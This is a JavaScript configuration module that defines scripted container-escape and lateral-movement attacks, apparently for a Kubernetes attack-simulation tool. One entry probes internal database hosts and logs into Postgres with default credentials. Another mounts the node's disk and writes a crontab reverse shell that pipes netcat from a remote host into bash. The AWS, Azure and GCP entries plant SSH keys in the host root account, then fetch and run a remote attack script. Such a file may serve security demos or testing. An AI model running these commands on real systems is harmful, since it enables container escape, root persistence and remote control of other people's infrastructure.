exports.default = {
  'test_attack': {
    'parameter': {'option_key': 'dirname', 'replace': 'DIR_NAME'},
    'commands': ['touch DIR_NAME']
  },
  'postgres_attack': {
    'commands': [
      "apt-get update",
      "apt-get install -y postgresql-client",
      "curl --max-time 15 database",
      "curl --max-time 15 mysql",
      "curl --max-time 15 postgres",
      "curl --max-time 15 storage",
      "curl --max-time 15 db",
      "export PGPASSWORD='postgres'; psql -h db -U postgres -c 'SELECT * FROM votes, pg_sleep(15)'"
    ],
  },
  'escape_pod_via_cron_aws': {
    'parameter': {'option_key': 'remote', 'replace': 'REMOTE_HOST_IP'},
    'commands': [
      "mkdir -p /mnt/node_volume",
      "mount /dev/xvda1 /mnt/node_volume",
      "rm /mnt/node_volume/run.sh",
      "echo '* * * * * root yum install -y nc' >> /mnt/node_volume/etc/crontab",
      "echo '* * * * * root /usr/bin/nc REMOTE_HOST_IP 5555 | /bin/bash' >> /mnt/node_volume/etc/crontab"
    ],
  },
  'escape_pod_via_ssh_aws': {
    'parameter': [
      {'option_key': 'remote', 'replace': 'REMOTE_HOST_IP'},
      {'option_key': 'sshkey', 'replace': 'SSH_KEY'},
      {'option_key': 'sshpubkey', 'replace': 'SSH_PUBKEY'},
    ],
    'commands': [
      "hostname",
      "mkdir -p /mnt/node_volume",
      "mount /dev/xvda1 /mnt/node_volume",
      "rm -rf .ssh; mkdir .ssh",
      "apt update; apt install ssh-client -y",
      "echo 'SSH_KEY' > .ssh/id_rsa.raw",
      "cat .ssh/id_rsa.raw | sed 's/||||/\\\\n/g' > .ssh/id_rsa",
      "echo 'SSH_PUBKEY' > .ssh/id_rsa.pub",
      "cat .ssh/id_rsa.pub >> /mnt/node_volume/root/.ssh/authorized_keys",
      "cp .ssh/id_rsa /mnt/node_volume/root/.ssh/id_rsa",
      "chmod 0600 .ssh/id_rsa /mnt/node_volume/root/.ssh/id_rsa",
      "echo 'ssh -i /root/.ssh/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null ec2-user@REMOTE_HOST_IP /bin/cat attack.sh > /tmp/attack.sh; sh -x /tmp/attack.sh' >> /mnt/node_volume/root/run.sh",
      "SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa root@$SSH_HOST sh -x ./run.sh",
    ],
  },
  'escape_pod_via_ssh_azure': {
    'parameter': [
      {'option_key': 'remote', 'replace': 'REMOTE_HOST_IP'},
      {'option_key': 'sshkey', 'replace': 'SSH_KEY'},
      {'option_key': 'sshpubkey', 'replace': 'SSH_PUBKEY'},
    ],
    'commands': [
      "mkdir -p /mnt/node_volume",
      "mount /dev/sda1 /mnt/node_volume",
      "rm -rf .ssh; mkdir .ssh",
      "apt update; apt install ssh-client tar -y",
      "echo 'SSH_KEY' > .ssh/id_rsa.raw",
      "cat .ssh/id_rsa.raw | sed 's/||||/\\\\n/g' > .ssh/id_rsa",
      "echo 'SSH_PUBKEY' > .ssh/id_rsa.pub",
      "cat .ssh/id_rsa.pub >> /mnt/node_volume/root/.ssh/authorized_keys",
      "cp .ssh/id_rsa /mnt/node_volume/root/.ssh/id_rsa",
      "chmod 0600 .ssh/id_rsa /mnt/node_volume/root/.ssh/id_rsa",
      "echo 'ssh -i /root/.ssh/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null azureuser@REMOTE_HOST_IP /bin/cat attack.sh > /tmp/attack.sh; sh -x /tmp/attack.sh' >> /mnt/node_volume/root/run.sh",
      "SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa root@$SSH_HOST sh -x ./run.sh",
    ],
  },
  'escape_pod_via_ssh_gcp': {
    'parameter': [
      {'option_key': 'remote', 'replace': 'REMOTE_HOST_IP'},
      {'option_key': 'sshkey', 'replace': 'SSH_KEY'},
      {'option_key': 'sshpubkey', 'replace': 'SSH_PUBKEY'},
    ],
    'commands': [
      "mkdir -p /mnt/node_volume",
      "mount /dev/sda1 /mnt/node_volume",
      "rm -rf .ssh; mkdir .ssh",
      "apt update; apt install ssh-client tar -y",
      "echo 'SSH_KEY' > .ssh/id_rsa.raw",
      "cat .ssh/id_rsa.raw | sed 's/||||/\\\\n/g' > .ssh/id_rsa",
      "echo 'SSH_PUBKEY' > .ssh/id_rsa.pub",
      "cat .ssh/id_rsa.pub >> /mnt/node_volume/root/.ssh/authorized_keys",
      "cp .ssh/id_rsa /mnt/node_volume/root/.ssh/id_rsa",
      "chmod 0600 .ssh/id_rsa /mnt/node_volume/root/.ssh/id_rsa",
      "echo 'ssh -i /root/.ssh/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null root@REMOTE_HOST_IP /bin/cat attack.sh > /tmp/attack.sh; sh -x /tmp/attack.sh' >> /mnt/node_volume/root/run.sh",
      "SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa root@$SSH_HOST sh -x ./run.sh",
    ],
  },

}
